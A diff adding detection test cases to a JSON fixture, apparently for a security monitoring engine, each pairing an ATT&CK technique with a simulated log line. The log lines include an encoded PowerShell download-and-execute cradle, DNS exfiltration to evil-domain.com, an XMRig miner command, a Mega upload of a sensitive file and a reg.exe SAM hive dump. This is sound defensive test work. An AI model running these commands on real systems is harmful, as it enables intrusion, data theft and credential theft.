@@ -445,5 +445,113 @@
     },
     "expected_detection": true,
     "min_risk": 85
+  },
+  {
+    "id": "T1055-001",
+    "name": "Process Injection via CreateRemoteThread",
+    "description": "Injects malicious code into legitimate process using CreateRemoteThread",
+    "tactic": "defense_evasion",
+    "technique": "T1055",
+    "payload": {
+      "task_type": "defense_evasion_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "CreateRemoteThread called from pid=1234 targeting pid=5678 (notepad.exe) with start address in VirtualAllocEx allocation",
+        "source_ip": "10.0.0.70",
+        "username": "user"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 85
+  },
+  {
+    "id": "T1059-001",
+    "name": "PowerShell Empire Agent",
+    "description": "PowerShell Empire framework agent beaconing",
+    "tactic": "execution",
+    "technique": "T1059.001",
+    "payload": {
+      "task_type": "execution_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "powershell.exe -nop -sta -w 1 -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA5ADIALgAxADYAOAAuADEALgAxADAAMAAvAGEAZwBlAG4AdAAuAHAAcwAxACcAKQA=",
+        "source_ip": "10.0.0.71",
+        "username": "svc_account"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 90
+  },
+  {
+    "id": "T1071-001",
+    "name": "DNS Tunneling Data Exfil",
+    "description": "Exfiltrates data via DNS queries to malicious domain",
+    "tactic": "command_and_control",
+    "technique": "T1071.004",
+    "payload": {
+      "task_type": "c2_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "DNS query for aGVsbG8ud29ybGQ=.evil-domain.com type=A from 10.0.0.72",
+        "source_ip": "10.0.0.72",
+        "destination_ip": "8.8.8.8"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "T1496-001",
+    "name": "Cryptojacking via XMRig",
+    "description": "Unauthorized cryptocurrency mining using XMRig",
+    "tactic": "impact",
+    "technique": "T1496",
+    "payload": {
+      "task_type": "impact_detection",
+      "severity": "medium",
+      "siem_event": {
+        "raw_log": "xmrig.exe -o pool.minexmr.com:4444 -u 44MnN1f3F... --donate-level=1 --max-cpu-usage=80",
+        "source_ip": "10.0.0.73",
+        "username": "SYSTEM"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 70
+  },
+  {
+    "id": "T1567-001",
+    "name": "Exfiltration to Mega.nz",
+    "description": "Data exfiltration using Mega.nz cloud storage",
+    "tactic": "exfiltration",
+    "technique": "T1567.002",
+    "payload": {
+      "task_type": "data_exfil_detection",
+      "severity": "high",
+      "siem_event": {
+        "raw_log": "megatool.exe upload --username attacker@tempmail.com --password temp123! C:\\data\\sensitive.pdf",
+        "source_ip": "10.0.0.74",
+        "destination_ip": "89.44.169.136"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 75
+  },
+  {
+    "id": "T1003-002",
+    "name": "SAM Database Dump via Reg.exe",
+    "description": "Dumps SAM database using reg.exe for offline credential cracking",
+    "tactic": "credential_access",
+    "technique": "T1003.002",
+    "payload": {
+      "task_type": "credential_access_detection",
+      "severity": "critical",
+      "siem_event": {
+        "raw_log": "reg.exe save HKLM\\SAM C:\\temp\\sam.save /y",
+        "source_ip": "10.0.0.75",
+        "username": "admin"
+      }
+    },
+    "expected_detection": true,
+    "min_risk": 90
   }
 ]
